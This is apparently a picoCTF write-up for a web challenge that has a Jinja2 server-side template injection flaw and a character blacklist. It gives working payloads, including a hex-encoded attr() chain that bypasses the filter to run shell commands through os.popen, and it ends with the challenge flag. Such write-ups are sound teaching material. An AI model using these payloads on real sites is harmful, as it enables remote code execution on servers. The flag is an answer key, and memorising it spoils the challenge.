# Overview
Website where you can announce whatever you want!  
<img width="500" height="350" alt="image" src="https://github.com/user-attachments/assets/922068b0-da07-44fc-8dea-1b1c0d59735b" />  

**Hint 1:** Server Side Template Injection  
**Hint 2:** Why is blacklisting characters a bad idea to sanitize input?  
  
It can be seen that the web will reflect back what we enter into the box  
=> Normally we will immediately think of SSTI vulnerabilities  
  
# Writeup
**B1:** Recon  
I'll try entering `{{7*'7'}}` into the box and see what the web returns  
=> web page returns the string 7777777  
=> We can immediately guess that this is python's Jinja2 templates  
**B2:** Now we will enter: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` to see what the web returns  
<img width="500" height="350" alt="image" src="https://github.com/user-attachments/assets/c72c9acc-f60c-419d-97de-b46a3f16b658" />  
It seems like some characters have been filtered  
<img width="500" height="350" alt="image" src="https://github.com/user-attachments/assets/3cdab2ce-0959-4b94-9154-141255f27fe3" />  
Filtering with a blacklist like this is actually quite risky  
=> We can encode characters to hex and then use request dynamic attribute access in Jinja2  
Now we wil enter `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`  
<img width="500" height="350" alt="image" src="https://github.com/user-attachments/assets/93ea84df-579e-4302-a007-3460b85da70e" />  
Web has actually executed our `Id` statement  
**B3:** Exploit  
Now we will find where the flag is using `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls -l')|attr('read')()}}`  
<img width="500" height="350" alt="image" src="https://github.com/user-attachments/assets/132c8812-2130-45f8-b945-260d3577f7a4" />  
=> Use `cat flag` to read  

Flag will be returned   
picoCTF{sst1_f1lt3r_byp4ss_a9824e27}  


